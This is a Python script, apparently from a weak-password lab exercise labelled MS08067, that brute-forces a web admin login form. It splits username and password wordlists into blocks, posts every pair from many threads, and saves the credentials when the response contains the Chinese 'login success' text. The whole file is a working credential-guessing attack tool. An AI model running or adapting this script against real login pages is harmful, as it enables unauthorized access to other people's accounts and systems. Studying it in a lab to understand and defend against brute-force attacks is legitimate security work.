import os
import threading
import requests
import time
BLOCK_SIZE = 1000 #分块大小
#列表分块函数
def partition(ls,size):
    return [ls[i:i+size] for i in range(0,len(ls),size)]
    #将传入的列表分割成多个子列表

# 编写破解函数，主要负责对数据进行分割，创建子进程并分配任务
def BruteForceHttp():
    listusername = [line.strip() for line in open("E:\demo\exp_python\身份认证\TopPwd.txt")]
    listPassword = [line.strip() for line in open("E:\demo\exp_python\身份认证\TopPwd.txt")]
    #读取账号文件和密码文件存入对应列表
    blockUsername = partition(listusername,BLOCK_SIZE)
    blockPassword = partition(listPassword,BLOCK_SIZE)
    #对账号列表和密码列表进行分块处理
    threads = []
    for sonUserBlock in blockUsername:
        #把不同的密码子块分给不同的线程去破解
        for sonPwdBlock in blockPassword:
            work = ThreadWork(sonUserBlock,sonPwdBlock)
            workThread = threading.Thread(target=work.start)
            #传入账号子块和密码子块实例化任务
            threads.append(workThread)
            #在threads中加入线程
    for t in threads:
        t.start()
    #开始子线程
    for t in threads:
        t.join()
    #阻塞主线程，等待所有子线程完成工作

class ThreadWork:
    url = "http://www.myblog.com/admin/login.php"
    headers = {
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.54' 
        }
    # 类的构建函数
    def __init__(self,username,password):
        self.username = username
        self.password = password
    
    def run(self,username,password):
        data = {
            'username':username,
            'password':password,
            'sub':'submit'
        }
        print("username:{},password:{}".format(username,password))
        response = requests.post(self.url,data=data,headers=self.headers)
        # 发送post请求，根据返回内容中是否包含登录失败的提示来判断登录成功与否
        if '登录失败' in response.text:
            pass
        if '登录成功' in response.text:
            #找到正确的账号密码后，使脚本停止
            print("successs!!! username: {}, password: {}".format(username, password))
            resultFile = open('result','w')
            resultFile.write("success!!! username: {}, password: {}".format(username, password))
            resultFile.close()
            os._exit(0) #代表程序终止
        else:
            time.sleep(1)

    def start(self):
        for userItem in self.username:
            for pwdItem in self.password:
                self.run(userItem,pwdItem)

if __name__ == '__main__':    
    print("\n#####################################")    
    print("#         => MS08067 <=             #")    
    print("#                                   #")    
    print("#     WeakPassowrd experiment       #")    
    print("#####################################\n")    
    BruteForceHttp()

